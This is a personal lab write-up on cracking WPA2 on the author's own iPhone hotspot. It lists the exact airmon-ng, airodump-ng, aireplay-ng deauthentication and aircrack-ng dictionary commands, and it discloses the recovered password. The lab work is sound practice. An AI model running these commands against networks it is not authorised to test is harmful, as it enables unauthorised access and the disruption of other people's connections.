# Lab 04: Wi-Fi Handshake Capture & Crack

**Date:** 2026-10-28
**Platform:** Kali Linux (VirtualBox) & Windows Host
**Difficulty:** Hard
**Target:** Personal iPhone Hotspot (Sito)
**Skill Focus:** Wireless Reconnaissance · Deauthentication Attack · WPA2 Cracking

---

## Objective

The goal of this lab was to capture a WPA2 4-way handshake from a wireless network and crack the password using a dictionary attack. 

## Setup & Troubleshooting

This lab required significant troubleshooting to get the hardware and virtualization working correctly:

1. **iPhone Hotspot Compatibility:** The target was an iPhone hotspot. iPhones default to 5GHz/WPA3, which the Ralink RT5370 USB adapter cannot see. We had to enable "Maximize Compatibility" on the iPhone to force it to broadcast a 2.4GHz/WPA2 signal.
2. **Random MAC Addresses:** iPhones randomly change their MAC address (BSSID) for privacy. We had to run `airodump-ng` multiple times to find the current, active BSSID before targeting it.
3. **File Paths:** Aircrack-ng could not find the default wordlist path. We used the `locate` command to find `rockyou.txt` in our previous Hashcat lab folder and used the absolute path.

## Execution

### 1. Enabling Monitor Mode
**Command:**
`sudo airmon-ng start wlan0`
`sudo airmon-ng check kill`

**Result:** Successfully created `wlan0mon` and killed interfering processes (NetworkManager, wpa_supplicant).

### 2. Reconnaissance & Targeting
**Command:**
`sudo airodump-ng --band bg wlan0mon`

**Result:** Identified the target network "Sito" on Channel 6 with BSSID `1E:52:BE:EC:87:F6`. 

### 3. Capturing the Handshake
**Command:**
`sudo airodump-ng -c 6 --bssid 1E:52:BE:EC:87:F6 -w sito-capture wlan0mon`

**Result:** Locked the adapter to the target. A Windows host PC was already connected to the hotspot, providing the necessary station traffic.

### 4. Forcing a Handshake (Deauth Attack)
**Command:**
`sudo aireplay-ng --deauth 10 -a 1E:52:BE:EC:87:F6 wlan0mon`

**Result:** Successfully sent deauthentication packets to kick the Windows PC off the network. When the PC automatically reconnected, `airodump-ng` captured the EAPOL 4-way handshake (visible in the top right corner of the terminal).

### 5. Cracking the Handshake
**Command:**
`aircrack-ng -w /home/kali/ncsa-hashing/rockyou.txt -b 1E:52:BE:EC:87:F6 sito-capture-02.cap`

**Result:** 
The dictionary attack cracked the WPA2 password in 34 seconds.

## Lessons Learned

* **The Human Element is the Weakest Link:** The password "batman28" is a common word with two numbers. It was found instantly in a standard wordlist. Strong, complex passphrases are essential.
* **iPhones are Difficult Targets:** The combination of 5GHz defaulting, WPA3, and MAC randomization makes iPhones harder to attack than standard routers. Patience and re-scanning are required.
* **Deauth is Essential:** You cannot capture a handshake if a device is already connected. You must force a disconnect and capture the reconnect sequence. 

## References

- Aircrack-ng Documentation: https://www.aircrack-ng.org/
- Rockyou Wordlist: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
